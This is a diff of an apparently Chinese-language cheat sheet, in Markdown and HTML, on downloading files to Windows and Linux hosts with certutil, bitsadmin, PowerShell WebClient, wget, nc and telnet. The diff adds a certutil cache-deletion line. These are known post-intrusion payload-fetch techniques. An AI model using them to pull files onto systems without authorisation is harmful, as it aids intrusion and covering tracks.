@@ -49,9 +49,10 @@ sGet.SaveToFile iLocal,2
 
 ## telnet
 
-`server: nc -lvp 2333 < test.txt`
-
-`client: telnet example.com -f C:\test.txt`
+```
+server: nc -lvp 2333 < test.txt
+client: telnet example.com -f C:\test.txt
+```
 
 ## ftp
 
@@ -105,25 +106,32 @@ WINDOWSTATE = "minimize">
 
 windows 2003 下的应用程序
 
-`certutil -urlcache -split -f http://192.168.1.100/test.txt C:\test.txt`
+```
+certutil -urlcache -split -f http://192.168.1.100/test.txt C:\test.txt
+certutil -urlcache -split -f http://192.168.1.100/test.txt C:\test.txt delete
+```
 
 ## bitsadmin
 
 和 certutil 一样, 但只适用于 windows 7 以上的系统
 
-`bitsadmin /rawreturn /transfer getfile http://192.168.1.100/test.txt C:\test.txt`
+```
+bitsadmin /rawreturn /transfer getfile http://192.168.1.100/test.txt C:\test.txt
+```
 
 ## powershell
 
-使用 `powershell -ExecutionPolicy Bypass -File .\get.ps1` 执行脚本
 
-`$client = new-object System.Net.WebClient`
-
-`$client.DownloadFile('http://192.168.1.100/test.txt', 'C:\test.txt')`
+```
+$client = new-object System.Net.WebClient
+$client.DownloadFile('http://192.168.1.100/test.txt', 'C:\test.txt')
+```
 
 ## wget
 
-`wget http://192.168.1.100/test.txt -P /root/test.txt`
+```
+wget http://192.168.1.100/test.txt -P /root/test.txt
+```
 
 ## ftp
 
@@ -147,9 +155,10 @@ exit
 
 ## nc
 
-`server: cat test.txt | nc -l 1234`
-
-`client: 192.168.1.100 1234 > test.txt`
+```
+server: cat test.txt | nc -l 1234
+client: 192.168.1.100 1234 > test.txt
+```
 
 ## perl
 
@@ -217,9 +226,9 @@ sGet.SaveToFile iLocal,2
 
 <h2 id="telnet">telnet</h2>
 
-<p><code>server: nc -lvp 2333 &lt; test.txt</code></p>
-
-<p><code>client: telnet example.com -f C:\test.txt</code></p>
+<pre><code>server: nc -lvp 2333 &lt; test.txt
+client: telnet example.com -f C:\test.txt
+</code></pre>
 
 <h2 id="ftp">ftp</h2>
 
@@ -271,25 +280,27 @@ WINDOWSTATE = "minimize"&gt;
 
 <p>windows 2003 下的应用程序</p>
 
-<p><code>certutil -urlcache -split -f http://192.168.1.100/test.txt C:\test.txt</code></p>
+<pre><code>certutil -urlcache -split -f http://192.168.1.100/test.txt C:\test.txt
+certutil -urlcache -split -f http://192.168.1.100/test.txt C:\test.txt delete
+</code></pre>
 
 <h2 id="bitsadmin">bitsadmin</h2>
 
 <p>和 certutil 一样, 但只适用于 windows 7 以上的系统</p>
 
-<p><code>bitsadmin /rawreturn /transfer getfile http://192.168.1.100/test.txt C:\test.txt</code></p>
+<pre><code>bitsadmin /rawreturn /transfer getfile http://192.168.1.100/test.txt C:\test.txt
+</code></pre>
 
 <h2 id="powershell">powershell</h2>
 
-<p>使用 <code>powershell -ExecutionPolicy Bypass -File .\get.ps1</code> 执行脚本</p>
-
-<p><code>$client = new-object System.Net.WebClient</code></p>
-
-<p><code>$client.DownloadFile('http://192.168.1.100/test.txt', 'C:\test.txt')</code></p>
+<pre><code>$client = new-object System.Net.WebClient
+$client.DownloadFile('http://192.168.1.100/test.txt', 'C:\test.txt')
+</code></pre>
 
 <h2 id="wget">wget</h2>
 
-<p><code>wget http://192.168.1.100/test.txt -P /root/test.txt</code></p>
+<pre><code>wget http://192.168.1.100/test.txt -P /root/test.txt
+</code></pre>
 
 <h2 id="ftp">ftp</h2>
 
@@ -312,9 +323,9 @@ exit
 
 <h2 id="nc">nc</h2>
 
-<p><code>server: cat test.txt | nc -l 1234</code></p>
-
-<p><code>client: 192.168.1.100 1234 &gt; test.txt</code></p>
+<pre><code>server: cat test.txt | nc -l 1234
+client: 192.168.1.100 1234 &gt; test.txt
+</code></pre>
 
 <h2 id="perl">perl</h2>
 
